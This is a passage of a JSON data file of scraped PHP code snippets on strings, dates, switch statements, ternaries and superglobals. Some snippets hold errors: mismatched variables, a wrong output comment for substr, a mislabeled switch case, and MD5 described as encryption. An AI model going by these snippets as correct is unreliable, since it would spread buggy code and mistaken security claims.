uppercase: \".strtoupper($x); echo \"<br>String convert to lowercase: \".strtolower($x); echo \"<br>convert first character into uppercase: \".ucfirst('good day'); echo \"<br>convert first character into lowercase: \".lcfirst('Good noon'); echo \"<br>convert first character of each word into uppercase: \".ucwords('keep going on!'); echo \"<br>Remove space from left side: \".ltrim(\"        hi..\"); echo \"<br>Remove space from right side: \".rtrim(\"hello          \"); echo \"<br>Remove both side of space: \".trim(\"       keep learning       \"); echo \"<br>string encrypted with MD5: \".md5($x); echo \"<br>Compare both string: \".strcoll('Hello','Hello').\"<br>\".strcmp('kinjal',$x); echo \"<br>Return part of string: \".substr('Hello Everyone',2); ?>\n",
    "reg_date": "2021-10-12T10:19:26.000Z"
  },
  {
    "id": 4253,
    "keyword": null,
    "link": null,
    "title": " php string interpolation",
    "description": "$value = \"My Value\"; $value2 = 5; $string = \"The value is {$value} and the second is {$value2}\";\n",
    "reg_date": "2021-10-12T10:19:27.000Z"
  },
  {
    "id": 4254,
    "keyword": null,
    "link": null,
    "title": " php string length",
    "description": " <?php $str = 'abcdef'; echo strlen($str); // 6  $str = ' ab cd '; echo strlen($str); // 7 ?>  \n<?php $name = 'abcdef'; echo strlen($str); // 6  $string = ' ab cd '; echo strlen($str); // 7 ?>\n<?php $str = 'abcdef'; echo strlen($str); // 6  $str = ' ab cd '; echo strlen($str); // 7 ?>\n<?php $str = 'php'; echo strlen($str); // 3  $str = 's p a c e'; echo strlen($str); // 9 ?>\n<?php $str = 'Hello World!'; echo strlen($str); // 12 ?>\n$str = 'abcdef'; echo strlen($str); // 6\n",
    "reg_date": "2021-10-12T10:19:27.000Z"
  },
  {
    "id": 4255,
    "keyword": null,
    "link": null,
    "title": " php string max length",
    "description": "$string = substr($string,0,255); //max 255 chars\n<?php echo substr('abcdef', 1);     // bcdef echo substr('abcdef', 1, 3);  // bcd echo substr('abcdef', 0, 4);  // abcd echo substr('abcdef', 0, 8);  // abcdef echo substr('abcdef', -1, 1); // f  // Accessing single characters in a string // can also be achieved using \"square brackets\" $string = 'abcdef';\n",
    "reg_date": "2021-10-12T10:19:27.000Z"
  },
  {
    "id": 4256,
    "keyword": null,
    "link": null,
    "title": " php string mayusculas",
    "description": " <?php $str = \"Mary Had A Little Lamb and She LOVED It So\"; $str = strtoupper($str); echo $str; // muestra: MARY HAD A LITTLE LAMB AND SHE LOVED IT SO ?>  \n",
    "reg_date": "2021-10-12T10:19:27.000Z"
  },
  {
    "id": 4257,
    "keyword": null,
    "link": null,
    "title": " php string nach zeichen zerlegen",
    "description": " <?php // Beispiel 1 $pizza  = \"Teil1 Teil2 Teil3 Teil4 Teil5 Teil6\"; $teile = explode(\" \", $pizza); echo $teile[0]; // Teil1 echo $teile[1]; // Teil2  // Beispiel 2 $data = \"foo:*:1023:1000::/home/foo:/bin/sh\"; list($user, $pass, $uid, $gid, $gecos, $home, $shell) = explode(\":\", $data); echo $user; // foo echo $pass; // *  ?>  \n",
    "reg_date": "2021-10-12T10:19:27.000Z"
  },
  {
    "id": 4258,
    "keyword": null,
    "link": null,
    "title": " php string only letters",
    "description": "$result = preg_replace(\"/[^a-zA-Z0-9]+/\", \"\", $s);\n",
    "reg_date": "2021-10-12T10:19:27.000Z"
  },
  {
    "id": 4259,
    "keyword": null,
    "link": null,
    "title": " php string parse with separator explode",
    "description": "$myString = \"9,admin@example.com,8\"; $myArray = explode(',', $myString); print_r($myArray);\n <?php // 1. &ouml;rnek $pizza  = \"dilim1 dilim2 dilim3 dilim4 dilim5 dilim6\"; $dilimler = explode(\" \", $pizza); echo $dilimler[0]; // dilim1 echo $dilimler[1]; // dilim2  // 2. &ouml;rnek $data = \"foo:*:1023:1000::/home/foo:/bin/sh\"; list($user, $pass, $uid, $gid, $gecos, $home, $shell) = explode(\":\", $data); echo $user; // foo echo $pass; // *  ?>  \n",
    "reg_date": "2021-10-12T10:19:27.000Z"
  },
  {
    "id": 4260,
    "keyword": null,
    "link": null,
    "title": " php string replace regex",
    "description": " <?php $string = 'The quick brown fox jumps over the lazy dog.'; $patterns = array(); $patterns[0] = '/quick/'; $patterns[1] = '/brown/'; $patterns[2] = '/fox/'; $replacements = array(); $replacements[2] = 'bear'; $replacements[1] = 'black'; $replacements[0] = 'slow'; echo preg_replace($patterns, $replacements, $string); ?>  \n <?php $string = 'April 15, 2003'; $pattern = '/(\\w+) (\\d+), (\\d+)/i'; $replacement = '${1}1,$3'; echo preg_replace($pattern, $replacement, $string); \npreg_replace($pattern, $replacement, $string);\n",
    "reg_date": "2021-10-12T10:19:27.000Z"
  },
  {
    "id": 4261,
    "keyword": null,
    "link": null,
    "title": " php string replace space",
    "description": "//Replace space with   for url to understand $new = str_replace(' ', ' ', $your_string);  //Alternate for URL use, use this urlencode ( string $str )\n$journalName = preg_replace('/\\s+/', '_', $journalName); \n",
    "reg_date": "2021-10-12T10:19:27.000Z"
  },
  {
    "id": 4262,
    "keyword": null,
    "link": null,
    "title": " php string starts with",
    "description": "//php check if first four characters of a string = http substr( $http, 0, 4 ) === \"http\"; //php check if first five characters of a string = https substr( $https, 0, 5 ) === \"https\"; \nfunction stringStartsWith($haystack,$needle,$case=true) {      if ($case){          return strpos($haystack, $needle, 0) === 0;      }      return stripos($haystack, $needle, 0) === 0;  }    function stringEndsWith($haystack,$needle,$case=true) {      $expectedPosition = strlen($haystack) - strlen($needle);      if ($case){          return strrpos($haystack, $needle, 0) === $expectedPosition;      }      return strripos($haystack, $needle, 0) === $expectedPosition;  }  echo stringStartsWith(\"Hello World\",\"Hell\"); // true  echo stringEndsWith(\"Hello World\",\"World\"); // true\nphpCopy<?php   $string = \"Mr. Peter\";   if(strncmp($string, \"Mr.\", 3) === 0){       echo \"The string starts with the desired substring.\";   }else        echo \"The string does not start with the desired substring.\"; ?> \nfunction startsWith($haystack, $needle) {      $length = strlen($needle);      return (substr($haystack, 0, $length) === $needle); }  function endsWith($haystack, $needle) {     $length = strlen($needle);     if ($length == 0) {         return true;     }      return (substr($haystack, -$length) === $needle); }\nphpCopy<?php   $string = \"Mr. Peter\";   if(substr($string, 0, 3) === \"Mr.\"){       echo \"The string starts with the desired substring.\";   }else        echo \"The string does not start with the desired substring.\"; ?> \nphpCopy<?php   $string = \"Mr. Peter\";   if(strpos( $string, \"Mr.\" ) === 0){       echo \"The string starts with the desired substring.\";   }else        echo \"The string does not start with the desired substring.\"; ?> \n",
    "reg_date": "2021-10-12T10:19:27.000Z"
  },
  {
    "id": 4263,
    "keyword": null,
    "link": null,
    "title": " php string take part",
    "description": "substr ( $string , $start , $length  );  /**Returns the extracted part of string;   *or FALSE on failure, or an empty string   */\n<?php $str = \"Africa Beautiful!\"; echo substr($str, 0, 6);  // Outputs: Africa echo substr($str, 0, -10); // Outputs: Beautiful echo substr($str, 0);     // Outputs: Africa Beautiful! ?>\n",
    "reg_date": "2021-10-12T10:19:28.000Z"
  },
  {
    "id": 4264,
    "keyword": null,
    "link": null,
    "title": " php string to array",
    "description": "$myString = \"9,admin@example.com,8\"; $myArray = explode(',', $myString); print_r($myArray);\n<?php // It doesnt get any better than this Example $pizza  = \"piece1 piece2 piece3 piece4 piece5 piece6\"; $pieces = explode(\" \", $pizza); echo $pieces[0]; // piece1 echo $pieces[1]; // piece2\n$array = explode(' ', $string); \nprint_r(explode(',',$yourstring));\nexplode(\" \",\"Geeks for Geeks\")\n<?php   $realArray = (array) $stdClass; ?>\n",
    "reg_date": "2021-10-12T10:19:28.000Z"
  },
  {
    "id": 4265,
    "keyword": null,
    "link": null,
    "title": " php string to date",
    "description": "$time = strtotime('10/16/2003');  $newformat = date('Y-m-d',$time);  echo $newformat; // 2003-10-16 \n$s = '06/10/2011 19:00:02'; $date = strtotime($s); echo date('d/M/Y H:i:s', $date); The above one is the one of the example of converting a string to date. echo $s ->format('Y-m-d'); The above one is another method \n$s = '08/11/2010 19:37:02'; $date = strtotime($s); echo date('Y-m-d H:i:s', $date);\n$s = '06/10/2011 19:00:02'; $date = strtotime($s); echo date('d/M/Y H:i:s', $date);\n$originalDate = \"2010-03-21\"; $newDate = date(\"d-m-Y\", strtotime($originalDate));\n$s = '06/10/2011 19:00:02';$date = strtotime($s);echo date('d/M/Y H:i:s', $date); The above one is the one of the example of converting a string to date. echo $s ->format('Y-m-d'); The above one is another method \n",
    "reg_date": "2021-10-12T10:19:28.000Z"
  },
  {
    "id": 4266,
    "keyword": null,
    "link": null,
    "title": " php string to int",
    "description": "intval($string);\n$int = intval($float);\ns = \"123\"; echo intval(s); // 123  s = \"hello\"; echo intval(s);\t//0\nphpCopy<?php   $variable = \"abc\"; $integer = (int)$variable; echo \"The variable has converted to a number and its value is $integer.\";   ?> \n$num = \"3.14\";  $int = (int)$num;//string to int $float = (float)$num;//string to float\n$num = \"3.14\"; $int = (int)$num;\n",
    "reg_date": "2021-10-12T10:19:28.000Z"
  },
  {
    "id": 4267,
    "keyword": null,
    "link": null,
    "title": " php string to uppercase",
    "description": "//string to all uppercase $string = \"String with Mixed use of Uppercase and Lowercase\"; //php string to uppercase $string = strtoupper($string); // = \"STRING WITH MIXED USE OF UPPERCASE AND LOWERCASE\"\n$lowercase = \"this is lower case\"; $uppercase = strtoupper($lowercase);  echo $uppercase; // THIS IS LOWER CASE\n$lowercase = \"this is lower case\"; $uppercase = strtoupper($lowercase);  echo $uppercase;\nstring strtoupper ( $string ) \n<?php echo strtoupper(\"Hello WORLD!\"); ?>\n<?php $str = \"Mary Had A Little Lamb and She LOVED It So\"; $str = strtoupper($str); echo $str; // show: MARY HAD A LITTLE LAMB AND SHE LOVED IT SO\n",
    "reg_date": "2021-10-12T10:19:28.000Z"
  },
  {
    "id": 4268,
    "keyword": null,
    "link": null,
    "title": " php string to uppwe",
    "description": "$lowercase = \"this is lower case\"; $uppercase = strtoupper($lowercase);  echo $uppercase; // THIS IS LOWER CASE\n",
    "reg_date": "2021-10-12T10:19:28.000Z"
  },
  {
    "id": 4269,
    "keyword": null,
    "link": null,
    "title": " php string underscore into camelcase",
    "description": "echo ucwords(\"hello world\"); \nfunction dashesToCamelCase($string, $capitalizeFirstCharacter = false)  {      $str = str_replace(' ', '', ucwords(str_replace('-', ' ', $string)));      if (!$capitalizeFirstCharacter) {         $str[0] = strtolower($str[0]);     }      return $str; }  echo dashesToCamelCase('this-is-a-string');\n",
    "reg_date": "2021-10-12T10:19:28.000Z"
  },
  {
    "id": 4270,
    "keyword": null,
    "link": null,
    "title": " php strip out special characters",
    "description": "function clean($string) {    $string = str_replace(' ', '-', $string); // Replaces all spaces with hyphens.     return preg_replace('/[^A-Za-z0-9\\-]/', '', $string); // Removes special chars. }\nphpCopy<?php $mainstr = \"<h2>Welcome to <b>PHPWorld</b></h2>\";  echo \"Text before remove: \\n\" . $mainstr;  echo \"\\n\\nText after remove: \\n\" .     str_ireplace(array('<b>', '</b>', '<h2>', '</h2>'), '',     htmlspecialchars($mainstr)); ?> \n",
    "reg_date": "2021-10-12T10:19:28.000Z"
  },
  {
    "id": 4271,
    "keyword": null,
    "link": null,
    "title": " php strip tags",
    "description": "echo strip_tags(\"Hello <b>world!</b>\");\n<?php $text = '<p>Test paragraph.</p><!-- Comment --> <a href=\"#fragment\">Other text</a>'; echo strip_tags($text); //Test paragraph. Other text  // Allow <p> and <a> echo strip_tags($text, '<p><a>'); //<p>Test paragraph.</p> <a href=\"#fragment\">Other text</a> // as of PHP 7.4.0 the line above can be written as: // echo strip_tags($text, ['p', 'a']); ?>  \n$text = '<a href=\"https://workforcenow.adp.com/mascsr/default/mdf/recruitment/recruitment.html?cid=ed2438b9-d7f4-45be-b3d8-8c924068c18a&amp;ccId=2036080543_6069&amp;jobId=329838&amp;source=CC2&amp;lang=en_US\">https://workforcenow.adp.com/mascsr/default/mdf/recruitment/recruitment.html?cid=ed2438b9-d7f4-45be-b3d8-8c924068c18a&amp;ccId=2036080543_6069&amp;jobId=329838&amp;source=CC2&amp;lang=en_US</a>'; \n$text = '<p>Test paraagraph.</p><!-- Comment --> <a href=\"#fragment\">Other text</a>';\n",
    "reg_date": "2021-10-12T10:19:28.000Z"
  },
  {
    "id": 4272,
    "keyword": null,
    "link": null,
    "title": " php strpos",
    "description": "$myString = 'Hello Bob how are you?';  if (strpos($myString, 'Bob') !== false) {      echo \"My string contains Bob\";  }\n <?php $mystring = 'abc'; $findme   = 'a'; $pos = strpos($mystring, $findme);  // Note our use of ===.  Simply == would not work as expected // because the position of 'a' was the 0th (first) character. if ($pos === false) {     echo \"The string '$findme' was not found in the string '$mystring'\"; } else {     echo \"The string '$findme' was found in the string '$mystring'\";     echo \" and exists at position $pos\"; } ?>  \n$result = strpos(\"haystack\", \"needle\");  if ($result != false) {   // text found }\n$mystring = 'abc'; $findme   = 'a'; $pos = strpos($mystring, $findme);\n$mystring = 'abc'; $findme   = 'a'; $pos = strpos($mystring, $findme);  // Note our use of ===.  Simply == would not work as expected // because the position of 'a' was the 0th (first) character. if ($pos === false) {     echo \"The string '$findme' was not found in the string '$mystring'\"; } else {     echo \"The string '$findme' was found in the string '$mystring'\";     echo \" and exists at position $pos\"; }\n <?php $mystring = 'abc'; $findme   = 'a'; $pos = strpos($mystring, $findme);  // El operador !== tambi&eacute;n puede ser usado. Puesto que != no funcionar&aacute; como se espera // porque la posici&oacute;n de 'a' es 0. La declaraci&oacute;n (0 != false) se eval&uacute;a a  // false. if ($pos !== false) {      echo \"La cadena '$findme' fue encontrada en la cadena '$mystring'\";          echo \" y existe en la posici&oacute;n $pos\"; } else {      echo \"La cadena '$findme' no fue encontrada en la cadena '$mystring'\"; } ?>  \n",
    "reg_date": "2021-10-12T10:19:28.000Z"
  },
  {
    "id": 4273,
    "keyword": null,
    "link": null,
    "title": " php strtotime",
    "description": "echo strtotime(\"now\"); //1624416532 echo date(\"d M. Y\", strtotime(\"now\")); // 23 Jun. 2021  $time_c = strtotime(\"2021-06-07 05:57:51\"); echo date(\"d M. Y\", $time_c); // 07 Jun. 2021 echo date(\"H:i\", $time_c); // 05:57\n$date = '25/05/2010'; $date = str_replace('/', '-', $date); echo date('Y-m-d', strtotime($date));\n$date = '25/05/2010'; $date = str_replace('/', '-', $date); echo date('Y-m-d', strtotime($date)); \n",
    "reg_date": "2021-10-12T10:19:28.000Z"
  },
  {
    "id": 4274,
    "keyword": null,
    "link": null,
    "title": " php strtotime 1 day ago from",
    "description": "date('Y-m-d', strtotime('+1 day', strtotime($date)))\n",
    "reg_date": "2021-10-12T10:19:29.000Z"
  },
  {
    "id": 4275,
    "keyword": null,
    "link": null,
    "title": " php strtotime plus 1 day",
    "description": "// add 1 day to the date above $n = date('Y-m-d', strtotime( $d . \" +1 days\"));  // add 1 month to the date above $n = date('Y-m-d', strtotime( $d . \" +1 month\"));  // add 1 year to the date above $n = date('Y-m-d', strtotime( $d . \" +1 year\"));  // subtract 1 day to the date above $n = date('Y-m-d', strtotime( $d . \" -1 days\"));  // subtract 1 month to the date above $n = date('Y-m-d', strtotime( $d . \" -1 month\"));  // subtract 1 year to the date above $n = date('Y-m-d', strtotime( $d . \" -1 year\"));\n$NewDate = date('Y-m-d', strtotime('+7 days'));\n",
    "reg_date": "2021-10-12T10:19:29.000Z"
  },
  {
    "id": 4276,
    "keyword": null,
    "link": null,
    "title": " php sub list",
    "description": "function sortByAge($a, $b) {      return $a['age'] > $b['age'];  }  $people=[      [\"age\"=>54,\"first_name\"=>\"Bob\",\"last_name\"=>\"Dillion\"],      [\"age\"=>22,\"first_name\"=>\"Sarah\",\"last_name\"=>\"Harvard\"],      [\"age\"=>31,\"first_name\"=>\"Chuck\",\"last_name\"=>\"Bartowski\"]  ];    usort($people, 'sortByAge'); //$people is now sorted by age (ascending)\nsubstr ( $string , $start , $length  );  /**Returns the extracted part of string;   *or FALSE on failure, or an empty string   */\nconst str = 'substr';  console.log(str.substr(1, 2)); // (1, 2): ub console.log(str.substr(1)); // (1): ubstr  /* Percorrendo de tr&aacute;s para frente */ console.log(str.substr(-3, 2)); // (-3, 2): st console.log(str.substr(-3)); // (-3): str \n<?php $str = \"Africa Beautiful!\"; echo substr($str, 0, 6);  // Outputs: Africa echo substr($str, 0, -10); // Outputs: Beautiful echo substr($str, 0);     // Outputs: Africa Beautiful! ?>\narray_slice() function is used to get selected part of an array. Syntax: array_slice(array, start, length, preserve) *preserve = false (default) If we put preserve=true then the key of value are same as original array.  Example (without preserve): <?php $a=array(\"red\",\"green\",\"blue\",\"yellow\",\"brown\"); print_r(array_slice($a,1,2)); ?>  Output: Array ( [0] => green [1] => blue )    Example (with preserve): <?php $a=array(\"red\",\"green\",\"blue\",\"yellow\",\"brown\"); print_r(array_slice($a,1,2,true)); ?>  Output: Array ( [1] => green [2] => blue )  \n",
    "reg_date": "2021-10-12T10:19:29.000Z"
  },
  {
    "id": 4277,
    "keyword": null,
    "link": null,
    "title": " php substr remove last 4 characters",
    "description": "//Remove the last character using substr $string = substr($string, 0, -1);\necho substr($string, 0, -3); \nphpCopy<?php $mystring = \"This is a PHP program.\"; echo(\"This is the string before removal: $mystring\\n\"); $newstring = rtrim($mystring, \". \"); echo(\"This is the string after removal: $newstring\"); ?> \n",
    "reg_date": "2021-10-12T10:19:29.000Z"
  },
  {
    "id": 4278,
    "keyword": null,
    "link": null,
    "title": " php sum array elements",
    "description": "<?php $items = [     ['label' => 'cake', 'name' => 'Cake', 'price' => 150],     ['label' => 'pizza', 'name' => 'Pizza', 'price' => 250],     ['label' => 'puff', 'name' => 'Veg Puff', 'price' => 20],     ['label' => 'samosa', 'name' => 'Samosa', 'price' => 14] ];  $arrSum = array_sum(array_column($items, 'price', 'name')); print \"Sum of Array : \".$arrSum.\"<br/>\"; ?>\n<?php $a=array(5,15,25); echo array_sum($a); ?>\nReturn the sum of all the values in the array (5+15+25):  <?php $a=array(5,15,25); echo array_sum($a); ?>\n",
    "reg_date": "2021-10-12T10:19:29.000Z"
  },
  {
    "id": 4279,
    "keyword": null,
    "link": null,
    "title": " php superglobals",
    "description": "#Superglobal  $_SERVER Superglobal Superglobals were introduced in PHP 4.1.0, and are built-in variables    that are always available in all scopes. Basically system variables. https://www.w3schools.com/php/php_superglobals.asp  Note: $_SERVER Superglobal  -- tells a little about the server and    the client  ============== #Example index.php <?php include 'server-info.php';?> <!DOCTYPE html> <html> <head>     <title>System Info</title>     <link rel=\"stylesheet\" href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css\"> </head> <body> <div class =\"container\">     <h1>Server & File Info</h1>     <?php if($server): ?>     <ul class=\"list-group\">     <?php foreach($server as $key => $value): ?>         <li class=\"list-group-item\">             <strong><?php echo $key; ?>: </strong>             <?php echo $value; ?>         </li>     <?php endforeach; ?>     </ul>      <?php endif; ?>      <h1>Client Info</h1>     <?php if($client): ?>     <ul class=\"list-group\">     <?php foreach($client as $key1 => $value1): ?>         <li class=\"list-group-item\">             <strong><?php echo $key1; ?>: </strong>             <?php echo $value1; ?>         </li>     <?php endforeach; ?>     </ul>      <?php endif; ?>  </body> </html> ================== #Example server-info.php <?php     # $_SERVER SUPERGLOBAL      //Create Server Array     $server =[         'Host Server Name' => $_SERVER['SERVER_NAME'],         'Http Host' => $_SERVER['HTTP_HOST'],         'Server Software' => $_SERVER['SERVER_SOFTWARE'],         'Document Root' => $_SERVER['DOCUMENT_ROOT'],         'Current Page' =>  $_SERVER['PHP_SELF'],         'Script Name' =>  $_SERVER['SCRIPT_NAME'],         'Absloute Path' =>  $_SERVER['SCRIPT_FILENAME']      ];      echo $server['Host Server Name'];     echo $server['Http Host'];     echo $server['Server Software'];     echo $server['Document Root'];     echo $server['Current Page'];     echo $server['Script Name'];     echo '<br>';     //also can show it all     print_r($server);      //Creat Client Array     $client = [         'Client System Info' => $_SERVER['HTTP_USER_AGENT'],         'Client IP' => $_SERVER['REMOTE_ADDR'],         'Remote Port' => $_SERVER['REMOTE_PORT']      ];     echo '<br>';     echo '<br>';     print_r($client);  ?>\necho \"dsd\"; \n",
    "reg_date": "2021-10-12T10:19:29.000Z"
  },
  {
    "id": 4280,
    "keyword": null,
    "link": null,
    "title": " php support block-level scope",
    "description": "PHP doesn't support block-level scope, however support function-level scoping.\n",
    "reg_date": "2021-10-12T10:19:29.000Z"
  },
  {
    "id": 4281,
    "keyword": null,
    "link": null,
    "title": " php switch",
    "description": "switch (fruit) {   case apple:     code to be executed if fruit=apple;     break;   case banana:     code to be executed if fruit=banana;     break;     ...   default:     code to be executed if fruit is different from all fruits; }\n$age=20; switch ($age) { \tcase 19:         echo \"Age is 18\";         break;     case 20:         echo \"Age is 20\";         break;     case 21:         echo \"Age is 21\";         break; }\n$fruit = \"apple\"; switch ($fruit) {   case \"apple\":     echo \"doctor\";     break;   case \"banana\":     echo \"monkey\";     break;   default:    \techo \"things\"; }//doctor\nswitch ($element) {     case 0:         echo \"i es igual a 0\";         break;     case 1:         echo \"i es igual a 1\";         break;     case 2:         echo \"i es igual a 2\";         break; }\nswitch ($i) {     case 0:         echo \"i ist gleich 0\";         break;     case 1:         echo \"i ist gleich 1\";         break;     case 2:         echo \"i ist gleich 2\";         break; }\nswitch ($i) {     case 0:         echo \"i equals 0\";         break;     case 1:         echo \"i equals 1\";         break;     case 2:         echo \"i equals 2\";         break;     default:        echo \"i is not equal to 0, 1 or 2\"; }\n",
    "reg_date": "2021-10-12T10:19:29.000Z"
  },
  {
    "id": 4282,
    "keyword": null,
    "link": null,
    "title": " php switch 2 variables",
    "description": "$age=20; switch ($age) { \tcase 19:         echo \"Age is 18\";         break;     case 20:         echo \"Age is 20\";         break;     case 21:         echo \"Age is 21\";         break; }\nswitch ([$color, $size]) {     case ['blue', 'small']:         echo 'blue and small';     break;      case ['red', 'large'];         echo 'red and large';     break; }\ncase 'car': case 'ferrari':     print(\"car or ferrari\");     break;\n",
    "reg_date": "2021-10-12T10:19:29.000Z"
  },
  {
    "id": 4283,
    "keyword": null,
    "link": null,
    "title": " php switch case array",
    "description": "$age=20; switch ($age) { \tcase 19:         echo \"Age is 18\";         break;     case 20:         echo \"Age is 20\";         break;     case 21:         echo \"Age is 21\";         break; }\nforeach ($array[0] as $key => $value) {     switch ($key) {         case 'Products' :             // do something             break ;         case 'customers' :             // do something             break ;         case 'Models' :             // do something             break ;      }  }\n",
    "reg_date": "2021-10-12T10:19:30.000Z"
  },
  {
    "id": 4284,
    "keyword": null,
    "link": null,
    "title": " php switch case multiple values per line",
    "description": "<?php switch ($i) {     case 0:     case 1:     case 2:         echo \"i is less than 3 but not negative\";         break;     case 3:         echo \"i is 3\"; } ?>\n",
    "reg_date": "2021-10-12T10:19:30.000Z"
  },
  {
    "id": 4285,
    "keyword": null,
    "link": null,
    "title": " php switich",
    "description": "switch (fruit) {   case apple:     code to be executed if fruit=apple;     break;   case banana:     code to be executed if fruit=banana;     break;     ...   default:     code to be executed if fruit is different from all fruits; }\nswitch ($i) {     case 0:         echo \"i equals 0\";         break;     case 1:         echo \"i equals 1\";         break;     case 2:         echo \"i equals 2\";         break;     default:        echo \"i is not equal to 0, 1 or 2\"; }\nswitch (n) {     case label1:         code to be executed if n=label1;         break;     case label2:         code to be executed if n=label2;         break;     case label3:         code to be executed if n=label3;         break;     ...     default:         code to be executed if n is different from all labels; } \n",
    "reg_date": "2021-10-12T10:19:30.000Z"
  },
  {
    "id": 4286,
    "keyword": null,
    "link": null,
    "title": " php syntax <<<",
    "description": " <?php $str = <<<EOD Example of string spanning multiple lines using heredoc syntax. EOD;  /* More complex example, with variables. */ class foo {     var $foo;     var $bar;      function __construct()     {         $this->foo = 'Foo';         $this->bar = array('Bar1', 'Bar2', 'Bar3');     } }  $foo = new foo(); $name = 'MyName';  echo <<<EOT My name is \"$name\". I am printing some $foo->foo. Now, I am printing some {$foo->bar[1]}. This should print a capital 'A': \\x41 EOT; ?>  \n",
    "reg_date": "2021-10-12T10:19:30.000Z"
  },
  {
    "id": 4287,
    "keyword": null,
    "link": null,
    "title": " php table form",
    "description": "<html> <body> <?php  $username = \"username\";  $password = \"password\";  $database = \"your_database\";  $mysqli = new mysqli(\"localhost\", $username, $password, $database);  $query = \"SELECT * FROM table_name\";   echo '<table border=\"0\" cellspacing=\"2\" cellpadding=\"2\">        <tr>            <td> <font face=\"Arial\">Value1</font> </td>            <td> <font face=\"Arial\">Value2</font> </td>            <td> <font face=\"Arial\">Value3</font> </td>            <td> <font face=\"Arial\">Value4</font> </td>            <td> <font face=\"Arial\">Value5</font> </td>        </tr>';  if ($result = $mysqli->query($query)) {     while ($row = $result->fetch_assoc()) {         $field1name = $row[\"col1\"];         $field2name = $row[\"col2\"];         $field3name = $row[\"col3\"];         $field4name = $row[\"col4\"];         $field5name = $row[\"col5\"];           echo '<tr>                    <td>'.$field1name.'</td>                    <td>'.$field2name.'</td>                    <td>'.$field3name.'</td>                    <td>'.$field4name.'</td>                    <td>'.$field5name.'</td>                </tr>';     }     $result->free(); }  ?> </body> </html>\n",
    "reg_date": "2021-10-12T10:19:30.000Z"
  },
  {
    "id": 4288,
    "keyword": null,
    "link": null,
    "title": " php tags",
    "description": " // The opening tag <?php   echo \"Here is the PHP code.\"; // Everything in between the tags is executed as PHP code. // The closing tag ?>\n<?= //do stuff here; ?>\n <?php echo \"Hello world\";  // ... more code  echo \"Last statement\";  // the script ends here with no PHP closing tag  \n <?php echo \"Bonjour le monde !\";  // ... encore du code  echo \"Derni&egrave;re instruction\";  // le script se termine ici, sans la balise de fermeture PHP  \n 1.  <?php echo 'Si vous voulez int&eacute;grez du code PHP dans des documents XHTML ou XML, utilisez ces balises'; ?>  2.  Vous pouvez utiliser la balise courte pour <?= '&eacute;crire ce texte' ?>.     Est &eacute;quivalent &agrave; <?php echo '&eacute;crire ce texte' ?>.  3.  <? echo 'ce code est entre des balises courtes'; ?>     Le code suivant <?= 'du texte' ?> est un raccourci pour <? echo 'du texte' ?> \n",
    "reg_date": "2021-10-12T10:19:30.000Z"
  },
  {
    "id": 4289,
    "keyword": null,
    "link": null,
    "title": " php temp directory",
    "description": "<?php //To get the name of the temp directory use the below sys_get_temp_dir(); // outputs the temp directory's name .. // To create a temporary file in the  // temporary files directory using sys_get_temp_dir() $temp_file = tempnam(sys_get_temp_dir(), 'Tux'); echo $temp_file; ?>\n",
    "reg_date": "2021-10-12T10:19:30.000Z"
  },
  {
    "id": 4290,
    "keyword": null,
    "link": null,
    "title": " php ternary",
    "description": "/* most basic usage */ $var = 5; $var_is_greater_than_two = ($var > 2 ? true : false); // returns true\n<?php $marks=40; print ($marks>=40) ? \"pass\" : \"Fail\"; ?>\n(Condition) ? (Statement1) : (Statement2); \n<?php  #Syntex   (if Condition) ? (stat1) : (stat2);  #example $var1 = 5; $var2 = 2;  echo $check = ($var1 > $var2) ? \"right\" : \"wrong\";  #output : right /* explination : if condition is true then display the stat1 and if condition is  worng then display stat2 */ ?>\n(conditional) ? (true) : (false);\n$result = $condition ? 'foo' : 'bar';\n",
    "reg_date": "2021-10-12T10:19:30.000Z"
  },
  {
    "id": 4291,
    "keyword": null,
    "link": null,
    "title": " php ternary operator",
    "description": "(Condition) ? (Statement1) : (Statement2); \n<?php  #Syntex   (if Condition) ? (stat1) : (stat2);  #example $var1 = 5; $var2 = 2;  echo $check = ($var1 > $var2) ? \"right\" : \"wrong\";  #output : right /* explination : if condition is true then display the stat1 and if condition is  worng then display stat2 */ ?>\n<?php $marks=40; print ($marks>=40) ? \"pass\" : \"Fail\"; ?>\n(conditional) ? (true) : (false);\n// Both ternary and if/else returns the same result  // ternary $result = $condition ? 'foo' : 'bar';  // if/else if ($condition) {     $result = 'foo'  } else {     $result = 'bar' }\necho $color = $color ?? 'red';\t//if value not exists then assign to them.\n",
    "reg_date": "2021-10-12T10:19:30.000Z"
  },
  {
    "id": 4292,
    "keyword": null,
    "link": null,
    "title": " php ternary operators",
    "description": "<?php  #Syntex   (if Condition) ? (stat1) : (stat2);  #example $var1 = 5; $var2 = 2;  echo $check = ($var1 > $var2) ? \"right\" : \"wrong\";  #output : right /* explination : if condition is true then display the stat1 and if condition is  worng then display stat2 */ ?>\n<?php $marks=40; print ($marks>=40) ? \"pass\" : \"Fail\"; ?>\n// Both ternary and if/else returns the same result  // ternary $result = $condition ? 'foo' : 'bar';  // if/else if ($condition) {     $result = 'foo'  } else {     $result = 'bar' }\n$y = $x ? \"true\" : \"false\";\nprint ($marks>=40) ? \"pass\" : \"Fail\";\n",
    "reg_date": "2021-10-12T10:19:30.000Z"
  },
  {
    "id": 4293,
    "keyword": null,
    "link": null,
    "title": " php ternary shorthand",
    "description": "(Condition) ? (Statement1) : (Statement2); \n<?php  #Syntex   (if Condition) ? (stat1) : (stat2);  #example $var1 = 5; $var2 = 2;  echo $check = ($var1 > $var2) ? \"right\" : \"wrong\";  #output : right /* explination : if condition is true then display the stat1 and if condition is  worng then display stat2 */ ?>\n$y = $x ? \"true\" : \"false\";\n",
    "reg_date": "2021-10-12T10:19:31.000Z"
  },
  {
    "id": 4294,
    "keyword": null,
    "link": null,
    "title": " php test if mail is working",
    "description": "filter_var($email, FILTER_VALIDATE_EMAIL)\n<?php  $email = \"youremail@gmail.com\"; $subject =  \"Email Test\"; $message = \"my mail test message\"; $sendMail = mail($email, $subject, $message); if($sendMail){  \techo \"Email Sent Successfully\"; }else{ \techo \"Mail Failed\"; } #If the mail() function exist but mails not going, check if a mail transport agent (MTA)such as sendmail or postfix is installed on your server ?> \n",
    "reg_date": "2021-10-12T10:19:31.000Z"
  },
  {
    "id": 4295,
    "keyword": null,
    "link": null,
    "title": " php text colors",
    "description": "echo \"<p> <font color=blue>One line simple string in  blue color</font> </p>\";\n",
    "reg_date": "2021-10-12T10:19:31.000Z"
  },
  {
    "id": 4296,
    "keyword": null,
    "link": null,
    "title": " php throw exception",
